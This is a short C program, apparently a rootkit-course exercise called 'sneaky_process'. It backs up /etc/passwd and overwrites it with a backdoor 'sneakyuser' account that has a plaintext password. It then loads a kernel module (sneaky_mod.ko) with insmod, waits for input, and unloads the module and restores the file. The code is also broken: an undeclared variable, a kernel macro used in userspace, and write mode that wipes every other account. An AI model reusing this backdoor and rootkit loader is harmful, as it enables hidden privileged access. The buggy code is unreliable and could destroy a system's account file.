#include <stdio.h>
#include <stdlib.h>
#include <linux/moduleparam.h>

static int pid;

int main(void) {
    //print process ID
    printf("sneaky_process pid = %d\n", getpid());
    pid = getpid();
    //copt passwd file
    system("cp /etc/passwd /tmp");
    //add new line to passwd
    FILE *out = fopen("/etc/passwd", "w");  
    fprintf(out, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");  
    fclose(out);  
    //load module
    system("insmod sneaky_mod.ko");
    module_param(pid, int, 0);
    //loop
    char cur;
    do {
        c = getchar();
    } while (c != 'q');
    //unload module
    system("rmmod sneaky_mod");
    //restore passwd
    system("cp /tmp/passwd /etc");
    return EXIT_SUCCESS;
}